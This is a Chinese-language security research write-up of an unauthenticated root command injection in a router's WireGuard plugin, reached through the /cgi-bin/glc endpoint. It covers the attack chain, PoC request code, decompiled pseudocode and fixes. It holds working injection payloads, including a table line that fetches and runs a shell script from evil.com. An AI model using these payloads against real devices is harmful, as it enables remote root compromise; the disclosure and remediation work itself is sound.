# 漏洞：WireGuard Server 未认证命令注入（N2 — generate_publickey）

<aside>
💡

`/cgi-bin/glc` 端点完全绕过认证和输入验证，直接加载原生 `.so` 插件并以 root 权限执行。`wg-server.so` 中的 `generate_publickey` 函数将用户输入的 `private_key` 通过 `sprintf` 直接拼接到 shell 命令中，经 `popen` 执行，导致未认证的远程命令注入（RCE）。

</aside>

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **Finding ID** | N2 |
| **状态** | `confirmed`（已实机验证） |
| **漏洞类型** | 未认证命令注入 → Root RCE |
| **认证要求** | **无**（`/cgi-bin/glc` 完全绕过了认证层） |
| **攻击面** | 远程（LAN 侧，无需任何凭据） |
| **权限** | root |
| **根因** | ① `/cgi-bin/glc` 不验证 session/ACL；② `generate_publickey` 用 `sprintf` 拼接 shell 命令不转义 |
| **PoC** | `exp/poc4_wg_generate_publickey_glc_rce.py` |
| **受影响函数** | `generate_publickey`、`set_config`、`set_peer` |

---

## 二、攻击链总览

```
攻击者（无需任何凭据）
    │
    ▼
① POST /cgi-bin/glc（JSON body，无 session）
    │
    ▼
② oui-access.lua — 系统已初始化，直接 return（不拦截）
    │
    ▼
③ www/cgi-bin/glc（C 程序）— dlopen() → dlsym() → 直接调用
    │  跳过所有 Lua 验证层！
    │  ✗ 没有 session 验证
    │  ✗ 没有 ACL 检查
    │  ✗ 没有输入校验
    │
    ▼
④ wg-server.so: generate_publickey()
    │  json_object_get(args, "private_key")
    │  → "$(touch /tmp/n2_glc_poc)"
    │
    ▼
⑤ sprintf("echo %s | wg pubkey", private_key)
    │  → "echo $(touch /tmp/n2_glc_poc) | wg pubkey"
    │
    ▼
⑥ getShellCommandReturn(cmd) → popen(cmd, "r")
    │
    ▼
root shell 执行 touch /tmp/n2_glc_poc → 文件创建
```

---

## 三、Source-to-Sink 逐层详解

### 第 1 层：Source — 未认证的 POST /cgi-bin/glc

**入口**：直接 POST JSON 到 `/cgi-bin/glc`，**不需要登录**。

PoC 的核心只有这几行：

```python
# 注意：没有 login()！没有 session！
payload = f"$(touch {args.target_file})"
body = {
    "object": "wg-server",
    "method": "generate_publickey",
    "args": {"private_key": payload},
}
result = post_json(args.base_url, "/cgi-bin/glc", body)
# ↑ 直接发送，响应中就能判断是否执行成功
```

**与需要认证漏洞的对比**：

| PoC | 漏洞 | 入口 | 认证 |
|-----|------|------|------|
| poc1 | C1 tor.set_config | `/rpc` | 需要 login() |
| poc2 | C4 upgrade_online | `/rpc` | 需要 login() |
| poc3 | C9 OVPN import | `/upload` | 需要 login() + sid |
| **poc4** | **N2 wg glc** | **`/cgi-bin/glc`** | **无** |
| poc6 | N1 ovpn glc | `/cgi-bin/glc` | 无 |

### 第 2 层：认证绕过 — oui-access.lua 形同虚设

`etc/nginx/conf.d/gl.conf` 中 `/cgi-bin/` 的路由配置：

```nginx
location /cgi-bin/ {
    access_by_lua_file /usr/share/gl-ngx/oui-access.lua;  # ← 看起来有认证
    include fastcgi_params;
    fastcgi_pass unix:/var/run/fcgiwrap.socket;
}
```

但 `oui-access.lua` 的逻辑是这样的：

```lua
-- ① localhost 直接放行
if ngx.var.remote_addr == "127.0.0.1" or ngx.var.remote_addr == "::1" then
    return      -- ← 跳过
end

-- ② HTTPS 重定向逻辑
if redirect_https and ngx.var.scheme == "http" then
    return ngx.redirect(...)
end

-- ③ 系统已初始化 → 直接 return（关键！）
if c:get("oui-httpd", "main", "inited") then
    return      -- ← 正常运行时走到这里，不拦截！
end

-- ④ 只有在未初始化时才校验主机名
local hosts = {['console.gl-inet.com']=true, ['localhost']=true, ...}
if not hosts[host] and lanip then
    return ngx.redirect(...)
end
```

**结论**：系统完成初始化后（`inited = 1`），`oui-access.lua` 对于 `/cgi-bin/` 请求**不做任何拦截**。它不是认证层，只是初始化引导时的主机名重定向逻辑。

### 第 3 层：glc 调度器 — 直接加载 .so 并调用

`www/cgi-bin/glc` 是一个原生 C 程序，其核心逻辑（从 strings 还原）：

```
┌──────────────────────────────────────────────┐
│ 1. 检查 REQUEST_METHOD == "POST"            │
│                                              │
│ 2. 读取 stdin → 解析 JSON                    │
│    格式: {s:s, s:s, s?o}                   │
│    → object = "wg-server"                   │
│    → method  = "generate_publickey"          │
│    → args    = {private_key: "$(touch ...)"} │
│                                              │
│ 3. 构造 .so 路径:                            │
│    /usr/lib/oui-httpd/rpc/wg-server.so      │
│                                              │
│ 4. dlopen() 加载动态库                       │
│                                              │
│ 5. dlsym() 查找函数符号                      │
│                                              │
│ 6. 直接调用，传入原始 JSON args              │
│    ✗ 没有 session 检查                       │
│    ✗ 没有 ACL 检查                           │
│    ✗ 不加载 Lua validator                   │
└──────────────────────────────────────────────┘
```

**glc 字符串证据**：

```
glc running, get env CGI_DEBUG=%s
REQUEST_METHOD  →  POST
CONTENT_LENGTH
method          object          args
{s:s,s:s,s?o}                  ← JSON 解析格式
%d dlopen: %s                  ← dlopen 错误日志
%d dlsym: %s                   ← dlsym 错误日志
glc call meth %s/%s            ← 函数调用日志
/usr/lib/oui-httpd/rpc         ← .so 文件基础路径
%s/%s.so                       ← 完整路径模板
```

### 第 4 层：两条路线的根本差异

```
路径 A（正常 RPC，需要认证）:          路径 B（glc 直接调用，不需要认证）:
─────────────────────────────────    ─────────────────────────────────
POST /rpc                             POST /cgi-bin/glc
    │                                      │
    ▼                                      ▼
oui-rpc.lua                            www/cgi-bin/glc (C 程序)
    │                                      │
    ├─ 验证 sid (session 有效性)           │  ← 完全跳过！
    ├─ 验证 ACL (rpc.access)               │  ← 完全跳过！
    ├─ 加载 validator:                     │  ← 完全跳过！
    │   generate_publickey.private_key     │
    │   = "^[%w%+/=]*$"    ← 正则验证     │
    │                                      │
    └─ glc_call() → POST /cgi-bin/glc     └─ dlopen("wg-server.so")
           (内部子请求）                       dlsym("generate_publickey")
                                              │
                                              ▼
                                         generate_publickey(args)
                                         ↑ 同一个函数，但没有经过
                                           任何验证！
```

**validator 讽刺之处**：即使 `^[%w%+/=]*$` 这个正则本可以阻止 `$()` 注入，它也只在 `/rpc` 路径生效。`/cgi-bin/glc` 根本不加载 validator。

### 第 5 层：Sink — sprintf 拼接 + popen 执行

`wg-server.so` 中 `generate_publickey` 的等价伪代码：

```c
json_t *generate_publickey(json_t *args) {
    // ① 从 JSON 提取 private_key，无任何过滤
    const char *private_key = json_string_value(
        json_object_get(args, "private_key"));
    // private_key = "$(touch /tmp/n2_glc_poc)"

    // ② sprintf 直接拼接到 shell 命令中（关键缺陷！）
    char cmd[256];
    sprintf(cmd, "echo %s | wg pubkey", private_key);
    // cmd = "echo $(touch /tmp/n2_glc_poc) | wg pubkey"

    // ③ getShellCommandReturn → popen 执行 shell 命令
    char *pubkey = getShellCommandReturn(cmd);
    // 等价于: popen(cmd, "r") → /bin/sh 执行

    return json_pack("{s:s}", "public_key", pubkey);
}
```

**wg-server.so 字符串证据**：

```
generate_publickey           ← 函数符号
echo %s | wg pubkey           ← sprintf 模板（%s 无转义！）
getShellCommandReturn          ← shell 执行封装函数
system                         ← 另一个相关 sink
popen                          ← 底层实现
private_key                    ← JSON 参数名
wireguard_server.main_server.private_key  ← UCI 存储 key
```

---

## 四、Payload 与攻击效果

### PoC 默认 payload

```python
payload = "$(touch /tmp/n2_glc_poc)"
```

执行的 shell 命令：

```bash
echo $(touch /tmp/n2_glc_poc) | wg pubkey
```

Shell 执行过程：
1. `touch /tmp/n2_glc_poc` → root 进程创建文件 `/tmp/n2_glc_poc`
2. `echo` 输出空字符串
3. `wg pubkey` 收到空输入，报错退出（不影响攻击）

### 更多可用的 payload 变体

| Payload | 效果 |
|---------|------|
| `$(touch /tmp/pwned)` | 创建文件，证明命令执行 |
| `` `touch /tmp/pwned` `` | 反引号同样可行 |
| `; id > /tmp/pwned; #` | 分号截断 + 输出重定向 |
| `\| id > /tmp/pwned \|` | 管道符号 |
| `$(curl http://evil.com/shell.sh \| sh)` | 下载并执行脚本 |
| `$(echo${IFS}123 > /tmp/pwned)` | 用 IFS 绕过空格限制 |

---

## 五、同一 .so 中的其他受影响函数

`wg-server.so` 中除了 `generate_publickey`，还有多个函数存在相同类型的命令注入：

### set_config（同样可被 glc 调用）

```c
// 伪代码
void set_config(json_t *args) {
    const char *new_key = json_string_value(
        json_object_get(args, "private_key"));
    // 比较新旧 key，如果不同则生成新公钥
    char cmd[256];
    sprintf(cmd, "echo %s | wg pubkey", new_key);
    getShellCommandReturn(cmd);     // ← 同款 sink
}
```

### set_peer（需要认证的 /rpc 路径，但同样可被 glc 调用）

```c
void set_peer(json_t *args) {
    const char *pubkey = json_string_value(
        json_object_get(args, "public_key"));
    char cmd[256];
    sprintf(cmd, "wg set wgserver peer %s remove 2>/dev/null", pubkey);
    system(cmd);                    // ← 同款 sink，用 system() 而非 popen()
}
```

**所有入口对应的 validator 都是形同虚设**：

```lua
-- wg-server.lua.decompiled.lua 中的"验证"
generate_publickey = { private_key = "^[%w%+/=]*$" }   -- 阻止 $() 但 glc 不加载
set_config         = { private_key = ".-" }             -- 任意字符
add_peer / set_peer = { public_key = ".+", private_key = ".+" }  -- 任意非空
```

---

## 六、漏洞发现与验证历程

从 FINDINGS.md / Source2Sink.md 中的 N2 条目：

1. **Triage 阶段**：IDA 批量扫描发现 `wg-server.so` 中存在 `echo %s | wg pubkey` + `getShellCommandReturn` / `system` 的 sink 模式
2. **静态分析**：发现 `/cgi-bin/glc` 直接加载 .so 而不经过 RPC 认证层
3. **Validator 对比**：发现 Lua validator 只对 `/rpc` 路径生效
4. **实机验证**（live 4.4.5）：
   - 未认证 `/cgi-bin/glc` `generate_publickey` → `$(touch /tmp/n2_glc)` 成功创建 root 文件
   - 未认证 `/cgi-bin/glc` `set_config` → `private_key='$(touch /tmp/n2_glc_cfg)'` 成功执行
   - 反引号 payload 同样可行
   - `;...;#` payload 同样可行
5. **已确认但未完全验证**：`set_peer`、`add_peer` 的可利用性

---

## 七、根因分析

### 根因 1：架构级认证缺失

`/cgi-bin/glc` 没有自己的认证机制，完全依赖 nginx 的 `oui-access.lua`。而 `oui-access.lua` 在系统初始化后不做任何拦截——它只是一个初始化引导时的重定向逻辑，不是真正的认证层。

### 根因 2：Trust Boundary 混淆

开发者假设所有到达 `glc` 的请求都已经经过了 RPC 认证层（`/rpc` → `oui-rpc.lua` → `glc_call`），但 `glc` 被 nginx 直接暴露在了 `/cgi-bin/glc` 路径上，任何人都可以通过 FastCGI 直接访问。

### 根因 3：sprintf 不加转义

即使 `private_key` 经过了 RPC 层的 validator（`^[%w%+/=]*$`），那个正则本身也太弱——它只限制 base64 字符，但正确的做法是在 sink 侧用 `execv` 数组传参而非 `sprintf` → `popen`。

---

## 九、Ghidra + r2 双重验证

对 `/usr/lib/oui-httpd/rpc/wg-server.so` 的 `generate_publickey` 进行两次独立反汇编：

| 工具 | 函数 | 地址 | 基本块 | 大小 |
|------|------|------|--------|------|
| Ghidra | generate_publickey | 0x0010b038 | - | 580B |
| r2 | generate_publickey | 0xb038 | 8 | 580B |

**验证一致** ✅：两个工具独立确认。wg-server.so 中关键函数包括：`generate_privatekey` @ 0x2fdc（12块/672B）、`generate_peer` @ 0x8288（37块/3044B）、`set_peer` @ 0x72ac（56块/2864B）、`generate_key` @ 0x8e6c（5块/264B）。

此外，s2s.so 中也包含 WireGuard 函数 `generate_wg_genkey` @ 0x1f8c（s2s.so）和 `wg_generate_public_key` @ 0x5ee0（原生 API）。两套实现独立。

---

## 十、修复建议

1. **为 /cgi-bin/glc 添加认证**：在 `glc` 二进制中或 nginx 层面增加 session/ACL 验证
2. **不用 sprintf 拼接 shell 命令**：改用 `fork()` + `execv()` 数组传参，或使用 `wg` 的 C API
3. **在 .so 侧做输入校验**：不要依赖上游（Lua 层）的验证，每个 .so 函数自己负责输入验证
4. **审计所有 /cgi-bin/glc 加载的 .so**：`wg-server.so`、`ovpn-server.so`、`nas-web.so` 等全部需要相同的修复
